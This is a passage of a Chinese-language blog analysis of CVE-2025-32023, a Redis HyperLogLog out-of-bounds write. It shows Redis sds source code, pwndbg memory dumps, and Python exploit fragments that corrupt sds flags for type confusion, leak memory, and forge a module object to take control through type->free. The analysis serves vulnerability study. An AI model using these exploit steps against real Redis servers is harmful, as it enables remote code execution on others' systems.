<p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2025-07-11-bd320665ad21fcff8300fdc9e2e0270c-3ac98d.png" title="image.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2025-07-11-bd320665ad21fcff8300fdc9e2e0270c-3ac98d.png" alt="image.png"></a></p>
<h5 id="寻找越界写目标"><a href="#寻找越界写目标" class="headerlink" title="寻找越界写目标"></a>寻找越界写目标</h5><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2025-07-11-619c1f3013ee7e5cc66707310d32facb-5d6e72.png" title="image.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2025-07-11-619c1f3013ee7e5cc66707310d32facb-5d6e72.png" alt="image.png"></a></p>
<p>在单次下， 我们可以从 registers 往前越界写任意（可构造）偏移一个字节。 作者的思路是在 HLL 结构前面构造 sds 结构， 然后修改 sds 结构的 len 来进行类型混淆。</p>
<p>sds 有几种不同的类型， 其取长度的方式也不一样·</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">size_t</span> <span class="title">sdslen</span><span class="params">(<span class="keyword">const</span> sds s)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> flags = s[<span class="number">-1</span>];</span><br><span class="line">    <span class="keyword">switch</span>(flags&amp;SDS_TYPE_MASK) &#123;</span><br><span class="line">        <span class="keyword">case</span> SDS_TYPE_5:</span><br><span class="line">            <span class="keyword">return</span> SDS_TYPE_5_LEN(flags);</span><br><span class="line">        <span class="keyword">case</span> SDS_TYPE_8:</span><br><span class="line">            <span class="keyword">return</span> SDS_HDR(<span class="number">8</span>,s)-&gt;len;</span><br><span class="line">        <span class="keyword">case</span> SDS_TYPE_16:</span><br><span class="line">            <span class="keyword">return</span> SDS_HDR(<span class="number">16</span>,s)-&gt;len;</span><br><span class="line">        <span class="keyword">case</span> SDS_TYPE_32:</span><br><span class="line">            <span class="keyword">return</span> SDS_HDR(<span class="number">32</span>,s)-&gt;len;</span><br><span class="line">        <span class="keyword">case</span> SDS_TYPE_64:</span><br><span class="line">            <span class="keyword">return</span> SDS_HDR(<span class="number">64</span>,s)-&gt;len;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>例如正常情况下， 我们使用 setrange 长度为<code>0x37fa-8</code>长度， 此时长度小于 65535 ,  根据函数<code>sdsReqType</code> 创建出来的 sds 数据，其 <code>flags</code> 位置应该是 2 （SDS_TYPE_16）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">//func sdsnewlen()-&gt; _sdsnewlen() -&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">char</span> <span class="title">sdsReqType</span><span class="params">(<span class="keyword">size_t</span> string_size)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (string_size &lt; <span class="number">1</span>&lt;&lt;<span class="number">5</span>)</span><br><span class="line">        <span class="keyword">return</span> SDS_TYPE_5;</span><br><span class="line">    <span class="keyword">if</span> (string_size &lt; <span class="number">1</span>&lt;&lt;<span class="number">8</span>)</span><br><span class="line">        <span class="keyword">return</span> SDS_TYPE_8;</span><br><span class="line">    <span class="keyword">if</span> (string_size &lt; <span class="number">1</span>&lt;&lt;<span class="number">16</span>)</span><br><span class="line">        <span class="keyword">return</span> SDS_TYPE_16;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> (LONG_MAX == LLONG_MAX)</span></span><br><span class="line">    <span class="keyword">if</span> (string_size &lt; <span class="number">1ll</span>&lt;&lt;<span class="number">32</span>)</span><br><span class="line">        <span class="keyword">return</span> SDS_TYPE_32;</span><br><span class="line">    <span class="keyword">return</span> SDS_TYPE_64;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">    <span class="keyword">return</span> SDS_TYPE_32;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后在 <code>_sdsnewlen</code> 函数中完成对 sds 结构的初始化</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">sds _sdsnewlen(<span class="keyword">const</span> <span class="keyword">void</span> *init, <span class="keyword">size_t</span> initlen, <span class="keyword">int</span> trymalloc) &#123;</span><br><span class="line">    <span class="keyword">char</span> type = sdsReqType(initlen);</span><br><span class="line">    <span class="comment">/* Empty strings are usually created in order to append. Use type 8</span></span><br><span class="line"><span class="comment">     * since type 5 is not good at this. */</span></span><br><span class="line">    <span class="keyword">if</span> (type == SDS_TYPE_5 &amp;&amp; initlen == <span class="number">0</span>) type = SDS_TYPE_8;</span><br><span class="line">    <span class="keyword">int</span> hdrlen = sdsHdrSize(type);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> *fp; <span class="comment">/* flags pointer. */</span></span><br><span class="line">    <span class="keyword">size_t</span> usable;</span><br><span class="line">	    ...</span><br><span class="line">    s = (<span class="keyword">char</span>*)sh+hdrlen;</span><br><span class="line">    fp = ((<span class="keyword">unsigned</span> <span class="keyword">char</span>*)s)<span class="number">-1</span>;</span><br><span class="line">	    ...</span><br><span class="line"><span class="keyword">switch</span>(type) &#123;</span><br><span class="line">        <span class="keyword">case</span> SDS_TYPE_5: &#123;</span><br><span class="line">            *fp = type | (initlen &lt;&lt; SDS_TYPE_BITS);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">case</span> SDS_TYPE_8: &#123;</span><br><span class="line">            SDS_HDR_VAR(<span class="number">8</span>,s);</span><br><span class="line">            sh-&gt;len = initlen;</span><br><span class="line">            sh-&gt;alloc = usable;</span><br><span class="line">            *fp = type;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">case</span> SDS_TYPE_16: &#123;</span><br><span class="line">            SDS_HDR_VAR(<span class="number">16</span>,s);</span><br><span class="line">            sh-&gt;len = initlen;</span><br><span class="line">            sh-&gt;alloc = usable;</span><br><span class="line">            *fp = type;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">case</span> SDS_TYPE_32: &#123;</span><br><span class="line">            SDS_HDR_VAR(<span class="number">32</span>,s);</span><br><span class="line">            sh-&gt;len = initlen;</span><br><span class="line">            sh-&gt;alloc = usable;</span><br><span class="line">            *fp = type;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">case</span> SDS_TYPE_64: &#123;</span><br><span class="line">            SDS_HDR_VAR(<span class="number">64</span>,s);</span><br><span class="line">            sh-&gt;len = initlen;</span><br><span class="line">            sh-&gt;alloc = usable;</span><br><span class="line">            *fp = type;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (initlen &amp;&amp; init)</span><br><span class="line">        <span class="built_in">memcpy</span>(s, init, initlen);</span><br><span class="line">    s[initlen] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> s;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>在内存中可以看到</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p/x <span class="number">0x8c</span> &amp; <span class="number">0x3</span></span><br><span class="line">$<span class="number">106</span> = <span class="number">0x0</span></span><br><span class="line">pwndbg&gt; p idx</span><br><span class="line">$<span class="number">107</span> = <span class="number">-38252</span></span><br><span class="line">pwndbg&gt; p idx*<span class="number">6</span>/<span class="number">8</span></span><br><span class="line">$<span class="number">108</span> = <span class="number">-28689</span></span><br><span class="line">pwndbg&gt; p hdr-&gt;registers</span><br><span class="line">$<span class="number">109</span> = <span class="number">0x7ffff797d015</span> <span class="string">&quot;&quot;</span></span><br><span class="line">pwndbg&gt;</span><br><span class="line">pwndbg&gt; x/<span class="number">20b</span>x <span class="number">0x7ffff7976000</span></span><br><span class="line"><span class="number">0x7ffff7976000</span>: <span class="number">0xfa</span>    <span class="number">0x37</span>    <span class="number">0xfa</span>    <span class="number">0x37</span>    <span class="number">0x02</span>    <span class="number">0x00</span>    <span class="number">0x00</span>    <span class="number">0x00</span></span><br><span class="line"><span class="number">0x7ffff7976008</span>: <span class="number">0x00</span>    <span class="number">0x00</span>    <span class="number">0x00</span>    <span class="number">0x00</span>    <span class="number">0x00</span>    <span class="number">0x00</span>    <span class="number">0x00</span>    <span class="number">0x00</span></span><br><span class="line"><span class="number">0x7ffff7976010</span>: <span class="number">0x00</span>    <span class="number">0x00</span>    <span class="number">0x00</span>    <span class="number">0x00</span></span><br><span class="line"></span><br><span class="line">pwndbg&gt; x/<span class="number">20b</span>x  <span class="number">0x7ffff7976000</span>+<span class="number">0x37fa</span><span class="number">-8</span></span><br><span class="line"><span class="number">0x7ffff79797f2</span>: <span class="number">0x00</span>    <span class="number">0x00</span>    <span class="number">0x00</span>    <span class="number">0x00</span>    <span class="number">0x00</span>    <span class="number">0x42</span>    <span class="number">0x42</span>    <span class="number">0x42</span></span><br><span class="line"><span class="number">0x7ffff79797fa</span>: <span class="number">0x42</span>    <span class="number">0x42</span>    <span class="number">0x42</span>    <span class="number">0x42</span>    <span class="number">0x42</span>    <span class="number">0x00</span>    <span class="number">0xfa</span>    <span class="number">0x37</span></span><br><span class="line"><span class="number">0x7ffff7979802</span>: <span class="number">0xfa</span>    <span class="number">0x37</span>    <span class="number">0x02</span>    <span class="number">0x00</span></span><br><span class="line">pwndbg&gt;</span><br><span class="line">pwndbg&gt; p/x *(struct sdshdr16 *)<span class="number">0x7ffff7976000</span></span><br><span class="line">$<span class="number">104</span> = &#123;</span><br><span class="line">  len = <span class="number">0x37fa</span>,</span><br><span class="line">  alloc = <span class="number">0x37fa</span>,</span><br><span class="line">  flags = <span class="number">0x2</span>,</span><br><span class="line">  buf = <span class="number">0x7ffff7976005</span></span><br><span class="line">&#125;</span><br><span class="line">pwndbg&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>由于 <code>sdslen</code> 函数取 sds 长度，是先根据不同的 flags， 然后再根据这个 flags 取计算这个 sds 的header 长度， 然后以当前地址减去 header长度取 len 这个变量</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">size_t</span> <span class="title">sdslen</span><span class="params">(<span class="keyword">const</span> sds s)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> flags = s[<span class="number">-1</span>];</span><br><span class="line">    <span class="keyword">switch</span>(flags&amp;SDS_TYPE_MASK) &#123;</span><br><span class="line">        <span class="keyword">case</span> SDS_TYPE_5:</span><br><span class="line">            <span class="keyword">return</span> SDS_TYPE_5_LEN(flags);</span><br><span class="line">        <span class="keyword">case</span> SDS_TYPE_8:</span><br><span class="line">            <span class="keyword">return</span> SDS_HDR(<span class="number">8</span>,s)-&gt;len;</span><br><span class="line">        <span class="keyword">case</span> SDS_TYPE_16:</span><br><span class="line">            <span class="keyword">return</span> SDS_HDR(<span class="number">16</span>,s)-&gt;len;</span><br><span class="line">        <span class="keyword">case</span> SDS_TYPE_32:</span><br><span class="line">            <span class="keyword">return</span> SDS_HDR(<span class="number">32</span>,s)-&gt;len;</span><br><span class="line">        <span class="keyword">case</span> SDS_TYPE_64:</span><br><span class="line">            <span class="keyword">return</span> SDS_HDR(<span class="number">64</span>,s)-&gt;len;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> __<span class="title">attribute__</span> ((__<span class="title">packed__</span>)) <span class="title">sdshdr16</span> &#123;</span></span><br><span class="line">    <span class="keyword">uint16_t</span> len; <span class="comment">/* used */</span></span><br><span class="line">    <span class="keyword">uint16_t</span> alloc; <span class="comment">/* excluding the header and null terminator */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> flags; <span class="comment">/* 3 lsb of type, 5 unused bits */</span></span><br><span class="line">    <span class="keyword">char</span> buf[];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> __<span class="title">attribute__</span> ((__<span class="title">packed__</span>)) <span class="title">sdshdr64</span> &#123;</span></span><br><span class="line">    <span class="keyword">uint64_t</span> len; <span class="comment">/* used */</span></span><br><span class="line">    <span class="keyword">uint64_t</span> alloc; <span class="comment">/* excluding the header and null terminator */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> flags; <span class="comment">/* 3 lsb of type, 5 unused bits */</span></span><br><span class="line">    <span class="keyword">char</span> buf[];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>而 <code>sdshdr64</code> 和<code>sdshdr16</code> 的结构体 大小不一样，因此如果将 <code>sds16</code>的 flags 改成 <code>SDS_TYPE_64</code> , 将为从上一个内存中取一个值作为 sds的长度 （造成一个类似类型混淆的效果） </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">fakelen &#x3D; 0x4142434445464748</span><br><span class="line"> </span><br><span class="line">r.setrange(&#39;sds:aa&#39;, 0x37fa - 11, p64(fakelen))  # sds @ 0x0005, p64() 00 00 00 00 </span><br><span class="line">r.setrange(&#39;sds:bb&#39;, 0x37fa - 8, b&#39;B&#39;*8)         # sds @ 0x3805, ................. fa 37 fa 37 02 ~</span><br></pre></td></tr></table></figure>



<p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2025-07-12-95209fbc6852fb89f57affe6eb949558-01f569.png" title="image.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2025-07-12-95209fbc6852fb89f57affe6eb949558-01f569.png" alt="image.png"></a></p>
<p>例如下面的这样的一个效果</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p&#x2F;x *(struct sdshdr16 *)0x7ffff7976000</span><br><span class="line">$115 &#x3D; &#123;</span><br><span class="line">  len &#x3D; 0x37fa,</span><br><span class="line">  alloc &#x3D; 0x37fa,</span><br><span class="line">  flags &#x3D; 0x2,</span><br><span class="line">  buf &#x3D; 0x7ffff7976005</span><br><span class="line">&#125;</span><br><span class="line">pwndbg&gt; p&#x2F;x *(struct sdshdr64 *)(0x7ffff7976000-11)</span><br><span class="line">$116 &#x3D; &#123;</span><br><span class="line">  len &#x3D; 0x41424344454647,</span><br><span class="line">  alloc &#x3D; 0x237fa37fa000000,</span><br><span class="line">  flags &#x3D; 0x0,</span><br><span class="line">  buf &#x3D; 0x7ffff7976006</span><br><span class="line">&#125;</span><br><span class="line">pwndbg&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>当从 <code>sdshder16</code> 被当成 <code>sdshdr64</code> 后， <code>sds:b</code> 的长度就变成了上一个内存的一个可控制， 作者是将这个值设置成<code>0x41424344454647</code>。 这样当我们就可以将这个<code>sds:b</code> 当作一个很长的字符串进行操作。作者后面的思路是在内存后喷一堆 embstr， 然后取读取 <code>sds:b</code> 的内容 。 由于此时 sds:b 长度很长，因此读取这个字符串的时候能读书很多的数据，可以读到内存后面很多的东西，这样就可以做 info leak。</p>
<p>然后通过写 <code>sds:b</code> 字符串到操作，在内存中伪造了一个 type 为 Modules 的 Object</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># fake module object</span><br><span class="line">pl &#x3D; p8(0x05) + dump[tofs+1:tofs+4]   # type, encoding, lru</span><br><span class="line">pl +&#x3D; p32(1)                          # refcount</span><br><span class="line">pl +&#x3D; p64(badr + 0x10)                # ptr</span><br><span class="line">r.setrange(&#39;sds:bb&#39;, tofs+3, pl)</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">RedisModuleType</span> &#123;</span></span><br><span class="line">    <span class="keyword">uint64_t</span> id; <span class="comment">/* Higher 54 bits of type ID + 10 lower bits of encoding ver. */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">RedisModule</span> *<span class="title">module</span>;</span></span><br><span class="line">    moduleTypeLoadFunc rdb_load;</span><br><span class="line">    moduleTypeSaveFunc rdb_save;</span><br><span class="line">    moduleTypeRewriteFunc aof_rewrite;</span><br><span class="line">    moduleTypeMemUsageFunc mem_usage;</span><br><span class="line">    moduleTypeDigestFunc digest;</span><br><span class="line">    moduleTypeFreeFunc <span class="built_in">free</span>;</span><br><span class="line">    moduleTypeFreeEffortFunc free_effort;</span><br><span class="line">    moduleTypeUnlinkFunc unlink;</span><br><span class="line">    moduleTypeCopyFunc copy;</span><br><span class="line">    moduleTypeDefragFunc defrag;</span><br><span class="line">    moduleTypeAuxLoadFunc aux_load;</span><br><span class="line">    moduleTypeAuxSaveFunc aux_save;</span><br><span class="line">    moduleTypeMemUsageFunc2 mem_usage2;</span><br><span class="line">    moduleTypeFreeEffortFunc2 free_effort2;</span><br><span class="line">    moduleTypeUnlinkFunc2 unlink2;</span><br><span class="line">    moduleTypeCopyFunc2 copy2;</span><br><span class="line">    moduleTypeAuxSaveFunc aux_save2;</span><br><span class="line">    <span class="keyword">int</span> aux_save_triggers;</span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">10</span>]; <span class="comment">/* 9 bytes name + null term. Charset: A-Z a-z 0-9 _- */</span></span><br><span class="line">&#125; moduleType;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">freeModuleObject</span><span class="params">(robj *o)</span> </span>&#123;</span><br><span class="line">    moduleValue *mv = o-&gt;ptr;</span><br><span class="line">    mv-&gt;type-&gt;<span class="built_in">free</span>(mv-&gt;value);</span><br><span class="line">    zfree(mv);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过需改 <code>type-&gt;free</code> 来控制 PC</p>
<h2 id="完整的利用流程"><a href="#完整的利用流程" class="headerlink" title="完整的利用流程"></a>完整的利用流程</h2><p>可以看 deepwiki 生成的这个流程图<sup id="fnref:4"><a href="#fn:4" rel="footnote"><span class="hint--top hint--error hint--medium hint--rounded hint--bounce" aria-label="https://deepwiki.com/leesh3288/CVE-2025-32023/2.2-six-stage-exploitation-methodology
">[4]</span></a></sup></p>
<p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2025-07-11-9df67aa6e235c5363cfae11b4eb03208-4a48ae.png" title="image.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2025-07-11-9df67aa6e235c5363cfae11b4eb03208-4a48ae.png" alt="image.png"></a></p>
<h2 id="Reference-link"><a href="#Reference-link" class="headerlink" title="Reference link"></a>Reference link</h2><div id="footnotes"><hr><div id="footnotelist"><ol style="list-style: none; padding-left: 0; margin-left: 40px"><li id="fn:1"><span style="display: inline-block; vertical-align: top; padding-right: 10px; margin-left: -40px">1.</span><span style="display: inline-block; vertical-align: top; margin-left: 10px;">https://redis.io/docs/latest/commands/pfmerge/<a href="#fnref:1" rev="footnote"> ↩</a></span></li><li id="fn:2"><span style="display: inline-block; vertical-align: top; padding-right: 10px; margin-left: -40px">2.</span><span style="display: inline-block; vertical-align: top; margin-left: 10px;">https://redis.io/docs/latest/operate/oss_and_stack/reference/internals/internals-sds/<a href="#fnref:2" rev="footnote"> ↩</a></span></li><li id="fn:3"><span style="display: inline-block; vertical-align: top; padding-right: 10px; margin-left: -40px">3.</span><span style="display: inline-block; vertical-align: top; margin-left: 10px;">https://github.com/leesh3288/CVE-2025-32023<a href="#fnref:3" rev="footnote"> ↩</a></span></li><li id="fn:4"><span style="display: inline-block; vertical-align: top; padding-right: 10px; margin-left: -40px">4.</span><span style="display: inline-block; vertical-align: top; margin-left: 10px;">https://deepwiki.com/leesh3288/CVE-2025-32023/2.2-six-stage-exploitation-methodology<a href="#fnref:4" rev="footnote"> ↩</a></span></li></ol></div></div></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {
        var options = {
            selector: '.gallery-item'
        };
        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);
        }</script>
  </div>
</article>

    <div class="blog-post-comments">
        <div id="disqus_thread">
            <noscript>Please enable JavaScript to view the comments.</noscript>
        </div>
    </div>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Articles</a></li>
         
          <li><a href="/search">Search</a></li>
         
          <li><a href="/atom.xml">RSS</a></li>
         
          <li><a href="/categories/">Categories</a></li>
         
          <li><a href="/link">Links</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2025-32023"><span class="toc-number">1.</span> <span class="toc-text">CVE-2025-32023</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-number">1.1.</span> <span class="toc-text">漏洞原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#PoC-%E6%9E%84%E9%80%A0"><span class="toc-number">1.2.</span> <span class="toc-text">PoC 构造</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%9E%84%E9%80%A0%E8%B6%8A%E7%95%8C-payload"><span class="toc-number">1.2.1.</span> <span class="toc-text">构造越界 payload</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AF%BB%E6%89%BE%E8%B6%8A%E7%95%8C%E5%86%99%E7%9B%AE%E6%A0%87"><span class="toc-number">1.2.2.</span> <span class="toc-text">寻找越界写目标</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%8C%E6%95%B4%E7%9A%84%E5%88%A9%E7%94%A8%E6%B5%81%E7%A8%8B"><span class="toc-number"></span> <span class="toc-text">完整的利用流程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reference-link"><span class="toc-number"></span> <span class="toc-text">Reference link</span></a>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://bestwing.me/CVE-2025-32023%20Redis%20%20HHL%20%E7%BC%96%E7%A0%81%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.html"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=https://bestwing.me/CVE-2025-32023%20Redis%20%20HHL%20%E7%BC%96%E7%A0%81%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.html&text=CVE-2025-32023 Redis  漏洞分析"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://bestwing.me/CVE-2025-32023%20Redis%20%20HHL%20%E7%BC%96%E7%A0%81%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.html&title=CVE-2025-32023 Redis  漏洞分析"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://bestwing.me/CVE-2025-32023%20Redis%20%20HHL%20%E7%BC%96%E7%A0%81%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.html&is_video=false&description=CVE-2025-32023 Redis  漏洞分析"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=CVE-2025-32023 Redis  漏洞分析&body=Check out this article: https://bestwing.me/CVE-2025-32023%20Redis%20%20HHL%20%E7%BC%96%E7%A0%81%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.html"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=https://bestwing.me/CVE-2025-32023%20Redis%20%20HHL%20%E7%BC%96%E7%A0%81%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.html&title=CVE-2025-32023 Redis  漏洞分析"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=https://bestwing.me/CVE-2025-32023%20Redis%20%20HHL%20%E7%BC%96%E7%A0%81%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.html&title=CVE-2025-32023 Redis  漏洞分析"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
